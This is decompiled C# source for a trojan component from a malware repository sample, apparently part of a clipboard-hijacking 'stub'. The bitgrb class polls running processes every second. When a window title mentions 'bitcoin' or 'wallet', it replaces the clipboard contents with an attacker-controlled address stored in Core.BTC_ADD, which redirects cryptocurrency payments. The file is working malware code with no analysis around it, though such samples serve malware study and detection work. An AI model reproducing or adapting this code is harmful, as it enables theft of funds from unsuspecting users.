// Decompiled with JetBrains decompiler
// Type: bitgrb
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Lime;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

public class bitgrb
{
  private static System.Timers.Timer Timer;

  public static void scanIt()
  {
    Process[] processes = Process.GetProcesses();
    int index = 0;
    while (index < processes.Length)
    {
      Process process = processes[index];
      if (process.MainWindowTitle.ToLower().Contains("BITCOIN".ToLower()) | process.MainWindowTitle.ToLower().Contains("WALLET".ToLower()))
      {
        try
        {
          ParameterizedThreadStart start;
          // ISSUE: reference to a compiler-generated field
          if (bitgrb._Closure\u0024__.\u0024IR1\u002D1 != null)
          {
            // ISSUE: reference to a compiler-generated field
            start = bitgrb._Closure\u0024__.\u0024IR1\u002D1;
          }
          else
          {
            // ISSUE: reference to a compiler-generated field
            bitgrb._Closure\u0024__.\u0024IR1\u002D1 = start = (ParameterizedThreadStart) (a0 => Clipboard.SetText(Conversions.ToString(a0)));
          }
          Thread thread = new Thread(start);
          thread.SetApartmentState(ApartmentState.STA);
          thread.Start((object) Core.BTC_ADD);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      checked { ++index; }
    }
  }

  public static void Start()
  {
    bitgrb.Timer = new System.Timers.Timer(1000.0);
    System.Timers.Timer timer = bitgrb.Timer;
    ElapsedEventHandler elapsedEventHandler;
    // ISSUE: reference to a compiler-generated field
    if (bitgrb._Closure\u0024__.\u0024IR2\u002D2 != null)
    {
      // ISSUE: reference to a compiler-generated field
      elapsedEventHandler = bitgrb._Closure\u0024__.\u0024IR2\u002D2;
    }
    else
    {
      // ISSUE: reference to a compiler-generated field
      bitgrb._Closure\u0024__.\u0024IR2\u002D2 = elapsedEventHandler = (ElapsedEventHandler) ((a0, a1) => bitgrb.scanIt());
    }
    timer.Elapsed += elapsedEventHandler;
    bitgrb.Timer.Enabled = true;
  }

  public static void stopme()
  {
    System.Timers.Timer timer = bitgrb.Timer;
    ElapsedEventHandler elapsedEventHandler;
    // ISSUE: reference to a compiler-generated field
    if (bitgrb._Closure\u0024__.\u0024IR3\u002D3 != null)
    {
      // ISSUE: reference to a compiler-generated field
      elapsedEventHandler = bitgrb._Closure\u0024__.\u0024IR3\u002D3;
    }
    else
    {
      // ISSUE: reference to a compiler-generated field
      bitgrb._Closure\u0024__.\u0024IR3\u002D3 = elapsedEventHandler = (ElapsedEventHandler) ((a0, a1) => bitgrb.scanIt());
    }
    timer.Elapsed += elapsedEventHandler;
    bitgrb.Timer.Stop();
  }
}
